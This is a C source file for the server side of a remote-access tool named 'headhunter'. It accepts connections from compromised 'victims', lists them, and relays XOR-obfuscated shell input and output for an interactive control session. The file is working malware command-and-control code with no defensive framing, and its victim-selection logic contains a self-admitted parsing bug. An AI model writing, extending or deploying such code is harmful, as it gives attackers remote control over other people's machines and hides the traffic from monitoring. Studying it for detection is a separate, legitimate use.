#include <stdio.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>

extern char* key;
extern int keylen;

int server_control_session(){
    int n;
    char buffer[MAXBUF];
    int selected_id;

    printf(PROMPT);
    fflush(NULL);
    while((n = read(a.src, buffer, MAXBUF)) > 0){
        if (strcmp(buffer, "help\n") == 0 || strcmp(buffer, "help\n\n") == 0) {
            printf("\nCommands:\n");
            printf(">help                   |  List all available commands\n");
            printf(">show connections       |  List active connections\n");
            printf(">use <connection id>    |  Switch session to specified connection by id\n");
            printf(">exit                   |  Close headhunter\n");
            printf("***********************************************************************\n\n");
        } else if (strcmp(buffer, "show connections\n") == 0 || strcmp(buffer, "list connections\n\n") == 0 ) {
            printf("\nCurrent connections:\nID  |  Address\n--------------------------\n");
            for (int i = 0; i < max_clients; i++){
                if (client_socket[i] == 0){ continue; }  // Continue just in case there is a random NULL socket
                printf("%3d |  %s\n", i + 1, get_socket_addr(client_socket[i]));
            }
            printf("--------------------------\n\n");
        } else if (str_starts_with(buffer, "use") == 1) {
            selected_id = 0;

            for (int c = 4; c < strlen(buffer); c++){
                if (isdigit(buffer[c])) {
                    selected_id += ((int) buffer[c] - 48) * (strlen(buffer) - 5);  // TODO FIX THIS MESS PLEASE
                }
            }

            if (selected_id > victim_count || selected_id < 0) {
                printf("Invalid id!\n\n");
            } else {
                printf("Entering victim control session with VID: %d...\n", selected_id);
                printf("Type \"!exit\" to background victim control session\n");
                selected_id += 3;
                return selected_id;
            }
        } else if (strcmp(buffer, "exit\n") == 0 || strcmp(buffer, "exit\n\n") == 0){
            printf("Exiting server control session...\n");
            return -1;
        } else if(strcmp(buffer, "\n") == 0 || strcmp(buffer, "\n\n") == 0){
        } else {
            printf("Unknown command. Enter 'help' for list of available commands.\n");
        }
        printf(PROMPT);
        fflush(NULL);
        for (int i = 0; i < MAXBUF; i++){ buffer[i] = '\0'; }  // Clear buffer
    }
    printf("The program is bad\n");
    fflush(NULL); sync();
    return -1;
}

void *Socket_Reader(){
    // Intercept incoming data from the current victim socket
    char buffer[MAXBUF];
    int n;
    read(a.dest, buffer, 18);
    char* xorhello = XOR(buffer, key, 18, keylen);
    write(STDOUT_FILENO, xorhello, 18);

    fflush(NULL);
    while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
	char* xorbuffer = XOR(buffer, key, n, keylen);
        if (write(STDOUT_FILENO, xorbuffer, n) < 0)  // writes data from victim fd to stdout
            printf("Error in function write()\n");
        fflush(NULL);
        //printf("%d>", a.dest);
        fflush(NULL);
    }

    if (n < 0)
        printf("Error in function read()\n");

    a.kill = 1;
    return NULL;
}

// *****************************************************
// *****************************************************
// *****************************************************

void *Socket_Writer()
{
    // Reads data from stdin and writes to socket
    int n;
    char buffer[MAXBUF];

    while (a.kill == 0 && (n = read(a.src, buffer, MAXBUF)) > 0) // reads from the stdin file descriptor and executes code if it's contents are above 0. a.src is passed the stdin fd on line 122
    {
	

        if (strcmp(newline_terminator(buffer), "!exit\n") == 0 || strcmp(newline_terminator(buffer), "!exit\n\n") == 0) { //Find a way
            printf("Exiting session...\n");
            a.kill = 1;
            return NULL;
        } else {
	
	    char* xorbuffer = XOR(buffer, key, n, keylen);

            write(a.dest, xorbuffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 12
        }
    }

    if (n < 0)
        printf("Error in function thread read()\n");

    a.kill = 1;
    return NULL;
}

// *****************************************************
// *****************************************************
// *****************************************************

// Declaration of a thread routine that will be called by pthread for reading from stdin on server and write to the victim file descriptor
void *Acceptor(){
    FD_SET(master_socket, &readfds);  // assigned master socket to the set
    for (i = 0; i < max_clients; i++)  // sets array of socket fds to zero so not read
        client_socket[i] = 0;

    while(1){
        FD_ZERO(&readfds);
        FD_SET(master_socket, &readfds);
        max_sd = master_socket;

        // add child sockets to set
        for ( i = 0 ; i < max_clients ; i++){
            // socket descriptor
            sd = client_socket[i];

            // if valid socket descriptor then add to read list
            if(sd > 0)
                FD_SET( sd , &readfds);

            // highest file descriptor number, need it for the select function
            if(sd > max_sd)
                max_sd = sd;
        }

        // wait for an activity on one of the sockets , timeout is NULL , so wait indefinitely
        activity = select( max_sd + 1, &readfds, NULL, NULL, NULL);

        if ((activity < 0) && (errno!=EINTR)) {}

        if (FD_ISSET(master_socket, &readfds)) {

            //wait for an activity on one of the sockets , timeout is NULL , so wait indefinitely
            activity = select( max_sd + 1 , &readfds , NULL , NULL , NULL);

            if ((activity < 0) && (errno!=EINTR)) {}

            if (FD_ISSET(master_socket, &readfds)) {
                if ((new_socket = accept(master_socket, (struct sockaddr *)&cli, &len))<0){
                    perror("accept");
                    exit(EXIT_FAILURE);
                }
                // add new socket to an array of sockets

                for (i = 0; i < max_clients; i++) {
                    // only if position is empty
                    if( client_socket[i] == 0 ){
                        client_socket[i] = new_socket;
                        victim_count++;
                        printf("\nConnection received with %s\n", get_socket_addr(new_socket));
                        printf("Press enter to or type a command to resume previous session\n\n");


                        break;
                    }
                }
            }
        }
    }
}
